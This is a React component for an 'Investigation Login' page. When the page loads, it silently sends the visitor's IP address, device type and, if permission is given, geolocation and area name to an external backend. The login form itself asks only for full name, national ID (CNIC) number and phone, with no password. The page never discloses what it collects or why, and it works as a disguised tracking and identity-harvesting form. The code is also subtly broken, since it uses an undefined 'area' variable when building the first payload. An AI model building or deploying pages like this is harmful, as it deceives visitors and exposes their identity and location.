import React, { useEffect, useState } from "react";

function Login() {
  const [name, setName] = useState("");
  const [cnic, setCnic] = useState("");
  const [phone, setPhone] = useState("");
  const [location, setLocation] = useState(null);
  const [ip, setIp] = useState("");
  const [device, setDevice] = useState("");
  const [status, setStatus] = useState("");
  const [userId, setUserId] = useState(null);
  const [areaName, setAreaName] = useState("");
  const API_BASE = "https://investigation-backend.vercel.app";
  const [nameError, setNameError] = useState("");
  const [cnicError, setCnicError] = useState("");
  const [phoneError, setPhoneError] = useState("");

  useEffect(() => {
    // Geolocation will be requested via getGeo() below with permission checks

    // Gather ip, geolocation and device then save partial record to DB
    const getIP = () =>
      fetch("https://api.ipify.org?format=json")
        .then((r) => r.json())
        .then((data) => (data && data.ip ? data.ip : ""))
        .catch(() => "");

    const getGeo = () =>
      new Promise((res) => {
        if (!navigator.geolocation) {
          setStatus("Geolocation not supported");
          return res(null);
        }

        const askPosition = () => {
          navigator.geolocation.getCurrentPosition(
            (pos) =>
              res({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
              }),
            (err) => {
              // Provide clearer messages for common errors
              if (err && err.code === 1)
                setStatus("Geolocation permission denied");
              else if (err && err.code === 2) setStatus("Position unavailable");
              else if (err && err.code === 3)
                setStatus("Location request timed out");
              else setStatus("Location unavailable");
              res(null);
            },
            { timeout: 7000 },
          );
        };

        // If Permissions API is available, check state first to avoid unexpected prompts
        if (navigator.permissions && navigator.permissions.query) {
          navigator.permissions
            .query({ name: "geolocation" })
            .then((perm) => {
              if (perm.state === "denied") {
                setStatus("Geolocation permission denied");
                return res(null);
              }
              // granted or prompt
              askPosition();
            })
            .catch(() => {
              // if permissions check fails, try requesting position directly
              askPosition();
            });
        } else {
          // No Permissions API; just ask for position
          askPosition();
        }
      });

    const ua = navigator.userAgent || "";
    const isMobile = /Mobi|Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);
    const deviceType = isMobile ? "mobile" : "desktop";
    setDevice(deviceType);

    const reverseGeocode = async (lat, lon) => {
      try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(
          lat,
        )}&lon=${encodeURIComponent(lon)}`;
        const res = await fetch(url, {
          headers: { Accept: "application/json" },
        });
        if (!res.ok) return "unknown";
        const data = await res.json();
        const addr = data && data.address ? data.address : null;
        const area =
          (addr &&
            (addr.city ||
              addr.town ||
              addr.village ||
              addr.suburb ||
              addr.hamlet)) ||
          addr?.county ||
          addr?.state ||
          data.display_name ||
          "unknown";
        return area;
      } catch (e) {
        return "unknown";
      }
    };

    (async () => {
      const [geo, ipAddr] = await Promise.all([getGeo(), getIP()]);
      const loc = geo
        ? { latitude: geo.latitude, longitude: geo.longitude }
        : null;
      if (loc) {
        setLocation(loc);
        // reverse geocode to get area name
        const area = await reverseGeocode(loc.latitude, loc.longitude);
        setAreaName(area || "unknown");
      }
      if (ipAddr) setIp(ipAddr);

      // prepare payload matching backend model
      const locPayload = loc
        ? {
            area: area || "unknown",
            coordinates: [loc.longitude, loc.latitude],
          }
        : { area: "unknown", coordinates: [0, 0] };

      const payload = {
        name: "",
        iPAddress: ipAddr || "",
        location: locPayload,
        deviceType: deviceType,
        cnic: "",
        phoneNumber: "",
      };

      // POST initial partial user record to deployed backend
      try {
        const r = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await r.json();
        if (data && data._id) setUserId(data._id);
      } catch (e) {
        // ignore failure; user can still submit later
      }
    })();
  }, []);

  // Validation helpers
  const validateName = (v) => {
    const trimmed = (v || "").trim();
    if (!trimmed) return "Name is required";
    if (trimmed.length < 2) return "Name must be at least 2 characters";
    return "";
  };

  const validateCnic = (v) => {
    const digits = (v || "").replace(/\D/g, "");
    if (!digits) return "CNIC is required";
    if (digits.length !== 13) return "CNIC must contain 13 digits";
    return "";
  };

  const validatePhone = (v) => {
    const val = (v || "").trim();
    if (!val) return ""; // optional
    const cleaned = val.replace(/\s+/g, "");
    if (!/^\+?\d{10,15}$/.test(cleaned))
      return "Enter a valid phone number (10-15 digits, optional +)";
    return "";
  };

  const onNameChange = (v) => {
    setName(v);
    setNameError(validateName(v));
  };

  const onCnicChange = (v) => {
    setCnic(v);
    setCnicError(validateCnic(v));
  };

  const onPhoneChange = (v) => {
    setPhone(v);
    setPhoneError(validatePhone(v));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // validate before submit
    const nErr = validateName(name);
    const cErr = validateCnic(cnic);
    const pErr = validatePhone(phone);
    setNameError(nErr);
    setCnicError(cErr);
    setPhoneError(pErr);
    if (nErr || cErr || pErr) {
      setStatus("Please fix validation errors");
      return;
    }
    setStatus("Saving...");

    // Build payload to match backend model
    const locPayload = location
      ? {
          area: "unknown",
          coordinates: [location.longitude, location.latitude],
        }
      : { area: "unknown", coordinates: [0, 0] };

    const cleanedCnic = (cnic || "").replace(/\D/g, "");
    const payload = {
      name: name.trim(),
      iPAddress: ip || "",
      location: locPayload,
      deviceType: device,
      cnic: cleanedCnic,
      phoneNumber: phone.trim(),
    };

    try {
      if (userId) {
        const res = await fetch(`${API_BASE}/api/user/update/${userId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Updated server record");
        else setStatus(`Update failed: ${res.status}`);
      } else {
        const res = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Saved to server");
        else setStatus(`Server error: ${res.status}`);
      }
    } catch (err) {
      setStatus("Failed to save to server");
    }
  };

  return (
    <div className="container py-4">
      <div className="row justify-content-center">
        <div className="col-12 col-sm-10 col-md-8 col-lg-6">
          <div className="card shadow-sm">
            <div className="card-body">
              <h3 className="card-title mb-3 text-center">
                Investigation Login
              </h3>

              {status ? (
                <div
                  className={`alert ${status.includes("Failed") || status.includes("error") || status.includes("failed") ? "alert-danger" : "alert-success"}`}
                  role="alert"
                >
                  {status}
                </div>
              ) : null}

              <form onSubmit={handleSubmit}>
                <div className="mb-3">
                  <label className="form-label">Name</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-user" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={name}
                      onChange={(e) => onNameChange(e.target.value)}
                      placeholder="Full name"
                      className={`form-control ${nameError ? "is-invalid" : ""}`}
                    />
                    {nameError ? (
                      <div className="invalid-feedback">{nameError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">CNIC</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-id-card" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={cnic}
                      onChange={(e) => onCnicChange(e.target.value)}
                      placeholder="CNIC (13 digits)"
                      className={`form-control ${cnicError ? "is-invalid" : ""}`}
                    />
                    {cnicError ? (
                      <div className="invalid-feedback">{cnicError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">Phone</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-phone" aria-hidden="true"></i>
                    </span>
                    <input
                      value={phone}
                      onChange={(e) => onPhoneChange(e.target.value)}
                      placeholder="Phone (optional)"
                      className={`form-control ${phoneError ? "is-invalid" : ""}`}
                    />
                    {phoneError ? (
                      <div className="invalid-feedback">{phoneError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="d-grid">
                  <button type="submit" className="btn btn-primary btn-lg">
                    <i className="fa fa-sign-in me-2" aria-hidden="true"></i>
                    Login
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Login;
